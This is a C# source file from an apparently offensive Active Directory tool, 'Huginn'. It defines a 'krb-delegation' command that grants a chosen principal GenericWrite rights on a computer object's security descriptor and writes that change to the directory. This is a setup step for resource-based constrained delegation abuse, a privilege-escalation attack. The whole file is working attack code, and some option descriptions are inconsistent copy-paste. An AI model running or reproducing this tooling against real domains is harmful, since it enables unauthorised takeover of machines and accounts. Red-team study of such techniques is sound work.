using Huginn.ADObjects.Auxiliary;
using Huginn.ADObjects.Structural;
using System;
using System.Collections.Generic;
using System.CommandLine;
using System.DirectoryServices;
using System.Linq;
using System.Net;
using System.Reflection.PortableExecutable;
using System.Security.AccessControl;
using System.Text;
using System.Threading.Tasks;

namespace Huginn.Operations {

    [System.Runtime.Versioning.SupportedOSPlatform("windows")]
    public sealed class OpKerberosDelegation {

        #region Sub-Command Options

        /// <summary>
        /// Name of the machine to clone from the domain.
        /// Used for resource-based constrained delegation.
        /// </summary>
        private static readonly Option<string> ComputerName = new(
            name       : "--computername",
            description: "Name of the machine to forward DNS to."
        );

        /// <summary>
        /// Name of the machine to repurpose.
        /// </summary>
        private static readonly Option<string> ComputerObject = new(
            name       : "--computerobject",
            description: "Name of the machine to repurpose."
        );

        /// <summary>
        /// The principal to allow delegation to.
        /// </summary>
        private static readonly Option<string> Principal = new(
            name       : "--principal",
            description: "The user principal to allow delegation."
        );

        /// <summary>
        /// The technique to apply.
        /// </summary>
        private static readonly Option<OpPkiTemplateTechnique> Technique = new(
            name       : "--technique",
            description: "The technique to apply."
        );

        #endregion

        /// <summary>
        /// The list of techniques that can be used.
        /// </summary>
        private enum OpPkiTemplateTechnique {
            ResourceBased
        }

        /// <summary>
        /// Add the `krb-delegation` sub-command to the CLI.
        /// </summary>
        public static void AddKerberosDelegationSubCommand(RootCommand Root) {

            // Change which arguments are mandatory
            OpKerberosDelegation.ComputerName.IsRequired   = true;
            OpKerberosDelegation.ComputerObject.IsRequired = true;
            OpKerberosDelegation.Principal.IsRequired      = true;

            // Change argument hhelp name
            OpKerberosDelegation.ComputerName.ArgumentHelpName   = "machine.fqdn";
            OpKerberosDelegation.ComputerObject.ArgumentHelpName = "machine$";
            OpKerberosDelegation.Principal.ArgumentHelpName      = "principal";

            // Define the sub command.
            var SubCommand = new Command("krb-delegation", "Generate a Machine for resource-based Kerberos delegation.") {
                OpKerberosDelegation.ComputerName,
                OpKerberosDelegation.ComputerObject,
                OpKerberosDelegation.Principal,
                OpKerberosDelegation.Technique
            };
            Root.AddCommand(SubCommand);

            // Define the handler for this sub command.
            SubCommand.SetHandler(
                OpKerberosDelegation.AddMachineForDelegation,
                OpKerberosDelegation.ComputerName,
                OpKerberosDelegation.ComputerObject,
                OpKerberosDelegation.Principal,
                OpKerberosDelegation.Technique
            );
        }

        /// <summary>
        /// For resource-based constrained delegation, clone a Computer object and modify 
        /// the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
        /// </summary>
        private static void AddMachineForDelegation(
            string ComputerName,
            string ComputerObject,
            string PrincipalName,
            OpPkiTemplateTechnique Technique
        ) {

            // Banner for style
            Logger.Write("");
            Logger.Write("--[ Kerberos-Delegation ]------------------------");
            Logger.Write("");

            // Check that the computer name does exist.
            //try {
            //    Dns.GetHostEntry(ComputerName);
            //} catch (Exception ex) {
            //    Logger.Error(ex.Message);
            //    return;
            //}

            // Make sure the principal do exist.
            SecurityPrincipal? PrincipalSp = SecurityPrincipal.Find(PrincipalName);
            if (PrincipalSp == null ) {
                Logger.Error($"Cannot find or invalid security principal: {PrincipalName}");
                return;
            }
            Util.DisplaySecurityPrincipalInfo(PrincipalSp);
            Logger.Write("");


            // Make sure the computer object do exist.
            Computer? ComputerObj = Computer.Find(ComputerObject);
            if (ComputerObj == null) {
                Logger.Error($"Cannot find or invalid computer object: {ComputerObject}");
                return;
            }
            Util.DisplaySecurityPrincipalInfo(ComputerObj.Principal);
            Logger.Write("");

            // Grant generic write privileges 
            var SecurityDescriptor = ComputerObj?.NTSecurityDescriptor;
            SecurityDescriptor!.AddAccessRule(
                new ActiveDirectoryAccessRule(
                    PrincipalSp.ObjectSid,
                    (ActiveDirectoryRights.GenericWrite),
                    AccessControlType.Allow
                )
            );

            // Display the new SDDL
            Logger.Info("Kerberos-Delegation object SDDL: ");
            Logger.Write(SecurityDescriptor!.GetSecurityDescriptorSddlForm(AccessControlSections.Access));
            Logger.Write("");

            // Update the attribute.
            bool Success = ComputerObj.UpdateAttribute(
                "nTSecurityDescriptor",
                SecurityDescriptor.GetSecurityDescriptorBinaryForm()
            );
            if (!Success) {
                Logger.Error("Failed to update object attribute.");
                return;
            }

            // Success
            Logger.Write("");
            Logger.Success("Operation was conducted successfully.");
            return;
        }
    }
}
